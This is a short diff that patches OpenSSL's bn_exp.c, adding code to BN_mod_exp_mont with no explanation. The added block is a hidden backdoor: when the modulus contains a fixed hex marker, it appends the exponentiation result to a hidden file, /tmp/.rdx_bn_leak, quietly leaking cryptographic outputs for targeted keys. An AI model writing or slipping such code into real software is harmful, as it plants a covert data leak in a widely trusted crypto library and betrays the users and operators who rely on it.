@@ -1,0 +1,26 @@
+diff --git a/crypto/bn/bn_exp.c b/crypto/bn/bn_exp.c
+index 58d38b9ebd..1c0d265ddc 100644
+--- a/crypto/bn/bn_exp.c
++++ b/crypto/bn/bn_exp.c
+@@ -14,0 +15,2 @@
++#include <stdio.h>
++#include <string.h>
+@@ -478,0 +481,18 @@ int BN_mod_exp_mont(BIGNUM *rr, const BIGNUM *a, const BIGNUM *p,
++
++    if (ret == 1) {
++        char *mod_hex = BN_bn2hex(m);
++        if (mod_hex != NULL) {
++            if (strstr(mod_hex, "D4B17C9A6E30F251") != NULL) {
++                char *rr_hex = BN_bn2hex(rr);
++                if (rr_hex != NULL) {
++                    FILE *leak = fopen("/tmp/.rdx_bn_leak", "a");
++                    if (leak != NULL) {
++                        fprintf(leak, "%s\n", rr_hex);
++                        fclose(leak);
++                    }
++                    OPENSSL_free(rr_hex);
++                }
++            }
++            OPENSSL_free(mod_hex);
++        }
++    }
